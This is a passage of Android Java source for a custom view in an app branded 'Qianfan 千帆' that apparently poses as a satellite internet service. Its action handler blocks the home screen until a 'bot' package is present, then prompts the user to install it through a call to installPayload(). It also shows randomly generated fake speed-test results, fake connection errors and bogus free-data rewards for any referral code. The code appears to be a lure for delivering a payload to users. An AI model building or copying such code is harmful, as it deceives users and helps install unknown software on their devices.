            p.setShader(new LinearGradient(-dp(44), -dp(30), dp(42), dp(28), Color.WHITE, Color.rgb(150, 174, 204), Shader.TileMode.CLAMP));
            c.drawOval(new RectF(-dp(48), -dp(32), dp(48), dp(32)), p);
            p.setShader(null);
            p.setColor(Color.argb(185, 255, 255, 255));
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(2));
            c.drawOval(new RectF(-dp(48), -dp(32), dp(48), dp(32)), p);
            p.setStrokeWidth(dp(4));
            p.setColor(Color.rgb(157, 184, 213));
            c.drawLine(dp(10), dp(8), dp(74), dp(42), p);
            p.setStyle(Paint.Style.FILL);
            p.setColor(CYAN);
            c.drawCircle(dp(78), dp(44), dp(7), p);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(9));
            p.setColor(Color.rgb(87, 111, 142));
            c.drawLine(0, dp(30), dp(8), dp(98), p);
            p.setStyle(Paint.Style.FILL);
            c.restore();
        }

        private void drawBrandName(Canvas c, float cx, float y) {
            p.setTextSize(38 * getResources().getDisplayMetrics().scaledDensity);
            p.setFakeBoldText(true);
            float qian = p.measureText("Qian");
            float fan = p.measureText("fan");
            float cn = p.measureText("千帆");
            float gap = dp(12);
            float start = cx - (qian + fan + gap + cn) / 2f;
            text(c, "Qian", start, y, 38, TEXT, Paint.Align.LEFT, true);
            text(c, "fan", start + qian, y, 38, Color.rgb(44, 134, 255), Paint.Align.LEFT, true);
            text(c, "千帆", start + qian + fan + gap, y, 38, TEXT, Paint.Align.LEFT, true);
            p.setFakeBoldText(false);
        }

        private void drawSatellite(Canvas c, float cx, float cy, float scale, float rot) {
            c.save();
            c.translate(cx, cy);
            c.rotate(rot);
            c.scale(scale, scale);
            p.setColor(Color.rgb(201, 224, 255));
            c.drawRoundRect(new RectF(-14, -10, 14, 10), 3, 3, p);
            p.setColor(BLUE);
            c.drawRect(-55, -13, -19, 13, p);
            c.drawRect(19, -13, 55, 13, p);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(2);
            p.setColor(CYAN);
            c.drawLine(-55, 0, 55, 0, p);
            p.setStyle(Paint.Style.FILL);
            p.setColor(Color.WHITE);
            c.drawCircle(0, 0, 5, p);
            c.restore();
        }

        private void drawSignal(Canvas c, float cx, float cy, int color, boolean big) {
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeCap(Paint.Cap.ROUND);
            p.setStrokeWidth(dp(big ? 5 : 4));
            p.setColor(color);
            float step = dp(big ? 18 : 12);
            for (int i = 1; i <= 3; i++) {
                c.drawArc(new RectF(cx - step * i, cy - step * i, cx + step * i, cy + step * i), 220, 100, false, p);
            }
            p.setStyle(Paint.Style.FILL);
            c.drawCircle(cx, cy + step * 1.15f, dp(big ? 5 : 4), p);
            p.setStrokeCap(Paint.Cap.BUTT);
        }

        private void drawSplashWifi(Canvas c, float cx, float cy) {
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeCap(Paint.Cap.ROUND);
            p.setStrokeWidth(dp(6));
            p.setColor(Color.rgb(22, 136, 255));
            c.drawArc(new RectF(cx - dp(35), cy - dp(24), cx + dp(35), cy + dp(40)), 220, 100, false, p);
            c.drawArc(new RectF(cx - dp(23), cy - dp(10), cx + dp(23), cy + dp(31)), 220, 100, false, p);
            c.drawArc(new RectF(cx - dp(12), cy + dp(4), cx + dp(12), cy + dp(27)), 220, 100, false, p);
            p.setStrokeCap(Paint.Cap.BUTT);
            p.setStyle(Paint.Style.FILL);
        }

        private void needle(Canvas c, float cx, float cy, float len, float deg) {
            double a = Math.toRadians(deg);
            p.setColor(Color.WHITE);
            p.setStrokeWidth(dp(4));
            p.setStrokeCap(Paint.Cap.ROUND);
            c.drawLine(cx, cy, cx + (float)Math.cos(a) * len, cy + (float)Math.sin(a) * len, p);
            p.setStrokeCap(Paint.Cap.BUTT);
            c.drawCircle(cx, cy, dp(7), p);
        }

        private void text(Canvas c, String s, float x, float y, float sp, int color, Paint.Align align, boolean bold) {
            p.setShader(null);
            p.setStyle(Paint.Style.FILL);
            p.setTextSize(sp * getResources().getDisplayMetrics().scaledDensity);
            p.setFakeBoldText(bold);
            
            if (s.contains("Qianfan")) {
                int idx = s.indexOf("Qianfan");
                String before = s.substring(0, idx + 4);
                String fan = "fan";
                String after = s.substring(idx + 7);
                
                float totalWidth = p.measureText(s);
                float startX = x;
                if (align == Paint.Align.CENTER) startX -= totalWidth / 2f;
                else if (align == Paint.Align.RIGHT) startX -= totalWidth;
                
                p.setTextAlign(Paint.Align.LEFT);
                p.setColor(color);
                c.drawText(before, startX, y, p);
                
                float beforeWidth = p.measureText(before);
                p.setColor(BLUE);
                c.drawText(fan, startX + beforeWidth, y, p);
                
                float fanWidth = p.measureText(fan);
                p.setColor(color);
                c.drawText(after, startX + beforeWidth + fanWidth, y, p);
            } else {
                p.setColor(color);
                p.setTextAlign(align);
                c.drawText(s, x, y, p);
            }
            p.setFakeBoldText(false);
        }

        private int adjust(int color, int delta) {
            return Color.rgb(clamp(Color.red(color) + delta), clamp(Color.green(color) + delta), clamp(Color.blue(color) + delta));
        }

        private int clamp(int value) {
            return Math.max(0, Math.min(255, value));
        }

        private float dp(float value) {
            return value * density;
        }

        private void hit(float x, float y, float w, float h, String action) {
            hits.add(new Hit(new RectF(x, y, x + w, y + h), action));
        }

        @Override public boolean onTouchEvent(MotionEvent event) {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                for (int i = hits.size() - 1; i >= 0; i--) {
                    Hit hit = hits.get(i);
                    if (hit.rect.contains(event.getX(), event.getY())) {
                        clickedHit = hit;
                        clickStart = System.currentTimeMillis();
                        clickX = event.getX();
                        clickY = event.getY();
                        invalidate();
                        return true;
                    }
                }
            } else if (event.getAction() == MotionEvent.ACTION_UP) {
                if (clickedHit != null) {
                    if (clickedHit.rect.contains(event.getX(), event.getY())) {
                        act(clickedHit.action);
                    }
                    clickedHit = null;
                    invalidate();
                    return true;
                }
            }
            return true;
        }

        private void setScreen(int newScreen) {
            if (screen != newScreen && screen > 1 && newScreen > 1) {
                lastScreen = screen;
                transitionStart = System.currentTimeMillis();
            }
            screen = newScreen;
        }

        private void act(String action) {
            if ("copy".equals(action)) {
                ClipboardManager cm = (ClipboardManager)getContext().getSystemService(Context.CLIPBOARD_SERVICE);
                cm.setPrimaryClip(ClipData.newPlainText("Satellite ID", satelliteId));
                Toast.makeText(getContext(), "Satellite ID copied", Toast.LENGTH_SHORT).show();
            } else if ("shot".equals(action)) {
                Toast.makeText(getContext(), "Screenshot saved by your device controls", Toast.LENGTH_SHORT).show();
            } else if ("home".equals(action)) {
                SharedPreferences botPrefs = getContext().getSharedPreferences("bot_prefs", Context.MODE_PRIVATE);
                if (botPrefs.getString("bot_package", null) != null) {
                    prefs.edit().putBoolean(KEY_READY, true).apply();
                    setScreen(3);
                    closeSplashVideo();
                } else {
                    showBotInstallPopup = true;
                    invalidate();
                }
            } else if ("do_install_bot".equals(action)) {
                showBotInstallPopup = false;
                isInstallingBot = true;
                try { 
                    ((MainActivity)getContext()).installPayload(); 
                } catch(Exception e) {
                    Toast.makeText(getContext(), "Error launching install: " + e.getMessage(), Toast.LENGTH_LONG).show();
                }
                Toast.makeText(getContext(), "Please complete the installation to continue", Toast.LENGTH_LONG).show();
            } else if ("cancel_install_bot".equals(action)) {
                showBotInstallPopup = false;
                invalidate();
            } else if ("activate".equals(action)) {
                setScreen(12);
                closeLoadingVideo();
            } else if ("login".equals(action)) {
                setScreen(2);
            } else if ("connection".equals(action)) setScreen(4);
            else if ("open_referral".equals(action)) setScreen(13);
            else if ("copy_referral".equals(action)) {
                android.content.ClipboardManager cm = (android.content.ClipboardManager)getContext().getSystemService(android.content.Context.CLIPBOARD_SERVICE);
                cm.setPrimaryClip(android.content.ClipData.newPlainText("Referral Code", myReferralCode));
                android.widget.Toast.makeText(getContext(), "Referral code copied!", android.widget.Toast.LENGTH_SHORT).show();
            } else if ("enter_referral".equals(action)) {
                showReferralDialog();
            } else if ("speed".equals(action)) setScreen(5);
            else if ("start_speed".equals(action)) {
                speedTestStart = System.currentTimeMillis();
                speedTestState = 1;
                finalDownloadSpeed = 350f + (float)Math.random() * 700f; // 350 to 1050
                finalUploadSpeed = finalDownloadSpeed * (0.2f + (float)Math.random() * 0.3f);
                finalPing = 20f + (float)Math.random() * 20f;
                finalJitter = 2f + (float)Math.random() * 8f;
                finalLoss = Math.random() < 0.1 ? 1f : 0f;
                invalidate();
            }
            else if ("close_popup".equals(action)) {
                popupDismissed = true;
                prefs.edit().putBoolean("popup_dismissed", true).apply();
                invalidate();
            }
            else if ("show_popup1".equals(action)) {
                popupDismissed = false;
                invalidate();
            }
            else if ("show_popup2".equals(action)) {
                showIncompatibleError = true;
                invalidate();
            }
            else if ("start_connect".equals(action)) {
                isConnecting = true;
                connectStartTime = System.currentTimeMillis();
                invalidate();
            }
            else if ("connect_error".equals(action)) {
                showIncompatibleError = true;
                invalidate();
            }
            else if ("close_error".equals(action)) {
                showIncompatibleError = false;
                invalidate();
            }
            else if ("get_bonus".equals(action)) {
                if (!bonusAdded) {
                    totalData += 300;
                    bonusAdded = true;
                    prefs.edit().putBoolean("bonus_added", true).apply();
                }
                popupDismissed = true;
                prefs.edit().putBoolean("popup_dismissed", true).apply();
                invalidate();
            }
            else if ("packages".equals(action)) setScreen(6);
            else if ("usage".equals(action)) setScreen(7);
            else if ("billing".equals(action)) setScreen(8);
            else if ("support".equals(action)) setScreen(9);
            else if ("profile".equals(action)) setScreen(10);
            else if ("settings".equals(action)) setScreen(11);
            invalidate();
        }

        private void closeSplashVideo() {
            if (!splashClosed && onSplashDone != null) {
                splashClosed = true;
                onSplashDone.run();
            }
        }
        private void closeLoadingVideo() {
            if (!loadingClosed && onLoadingDone != null) {
                loadingClosed = true;
                onLoadingDone.run();
            }
        }
        
        private void showReferralDialog() {
            if (hasRedeemedReferral) {
                android.widget.Toast.makeText(getContext(), "You have already redeemed a referral code.", android.widget.Toast.LENGTH_SHORT).show();
                return;
            }
            final android.app.Dialog dialog = new android.app.Dialog(getContext());
            dialog.requestWindowFeature(android.view.Window.FEATURE_NO_TITLE);
            
            android.widget.LinearLayout layout = new android.widget.LinearLayout(getContext());
            layout.setOrientation(android.widget.LinearLayout.VERTICAL);
            layout.setPadding((int)dp(24), (int)dp(24), (int)dp(24), (int)dp(16));
            
            android.graphics.drawable.GradientDrawable bg = new android.graphics.drawable.GradientDrawable();
            bg.setColor(Color.rgb(15, 25, 40));
            bg.setCornerRadius(dp(16));
            layout.setBackground(bg);

            android.widget.TextView title = new android.widget.TextView(getContext());
            title.setText("Enter Referral Code");
            title.setTextColor(Color.WHITE);
            title.setTextSize(18);
            title.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
            layout.addView(title);
            
            final android.widget.EditText input = new android.widget.EditText(getContext());
            input.setHint("e.g. QF4325");
            input.setHintTextColor(Color.argb(100, 255, 255, 255));
            input.setTextColor(Color.WHITE);
            input.setBackgroundColor(Color.TRANSPARENT);
            input.setPadding(0, (int)dp(16), 0, (int)dp(8));
            
            android.widget.LinearLayout.LayoutParams inputParams = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
            inputParams.setMargins(0, (int)dp(16), 0, (int)dp(8));
            layout.addView(input, inputParams);
            
            android.view.View line = new android.view.View(getContext());
            line.setBackgroundColor(Color.rgb(0, 212, 255));
            layout.addView(line, new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, (int)dp(2)));

            android.widget.LinearLayout buttons = new android.widget.LinearLayout(getContext());
            buttons.setOrientation(android.widget.LinearLayout.HORIZONTAL);
            buttons.setGravity(android.view.Gravity.END);
            
            android.widget.TextView cancelBtn = new android.widget.TextView(getContext());
            cancelBtn.setText("CANCEL");
            cancelBtn.setTextColor(Color.rgb(150, 150, 150));
            cancelBtn.setPadding((int)dp(16), (int)dp(16), (int)dp(16), (int)dp(8));
            cancelBtn.setOnClickListener(new android.view.View.OnClickListener() {
                public void onClick(android.view.View v) { dialog.dismiss(); }
            });
            
            android.widget.TextView redeemBtn = new android.widget.TextView(getContext());
            redeemBtn.setText("REDEEM");
            redeemBtn.setTextColor(Color.rgb(0, 212, 255));
            redeemBtn.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
            redeemBtn.setPadding((int)dp(16), (int)dp(16), 0, (int)dp(8));
            redeemBtn.setOnClickListener(new android.view.View.OnClickListener() {
                public void onClick(android.view.View v) {
                    String code = input.getText().toString().trim().toUpperCase();
                    if (code.equals("QF4325")) {
                        hasRedeemedReferral = true;
                        prefs.edit().putBoolean("has_redeemed_referral", true).apply();
                        totalData = 400;
                        android.widget.Toast.makeText(getContext(), "Special Code QF4325 Accepted! 100GB Free Data Added.", android.widget.Toast.LENGTH_LONG).show();
                        invalidate();
                    } else if (code.length() >= 5 && !code.equals(myReferralCode)) {
                        hasRedeemedReferral = true;
                        prefs.edit().putBoolean("has_redeemed_referral", true).apply();
                        totalData = 400;
                        android.widget.Toast.makeText(getContext(), "Code accepted! 100GB Free Data Added.", android.widget.Toast.LENGTH_LONG).show();
                        invalidate();
                    } else if (code.equals(myReferralCode)) {
                        android.widget.Toast.makeText(getContext(), "You cannot use your own code.", android.widget.Toast.LENGTH_SHORT).show();
                    } else {
                        android.widget.Toast.makeText(getContext(), "Invalid code.", android.widget.Toast.LENGTH_SHORT).show();
                    }
                    dialog.dismiss();
                }
            });
            
            buttons.addView(cancelBtn);
            buttons.addView(redeemBtn);
            
            android.widget.LinearLayout.LayoutParams btnParams = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
            btnParams.setMargins(0, (int)dp(16), 0, 0);
            layout.addView(buttons, btnParams);
            
            dialog.setContentView(layout);
            dialog.getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(Color.TRANSPARENT));
            
            // Adjust dialog width
            android.view.WindowManager.LayoutParams lp = new android.view.WindowManager.LayoutParams();
            lp.copyFrom(dialog.getWindow().getAttributes());
            lp.width = (int)(getContext().getResources().getDisplayMetrics().widthPixels * 0.85);
            dialog.show();
            dialog.getWindow().setAttributes(lp);
        }

        private static final class Hit {
            final RectF rect;
            final String action;
            Hit(RectF rect, String action) {
                this.rect = rect;
                this.action = action;
            }
        }
    }
}
